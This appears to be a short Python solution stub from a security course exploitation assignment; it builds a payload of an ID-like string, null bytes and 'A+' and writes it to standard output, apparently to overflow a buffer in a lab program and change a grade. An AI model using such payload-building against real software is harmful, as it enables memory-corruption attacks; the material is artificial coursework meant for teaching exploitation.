import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
payload =b'u1027506'
payload += b'\x00\x00'
payload += b'A+'

# Launch the attack!
sys.stdout.buffer.write(payload)
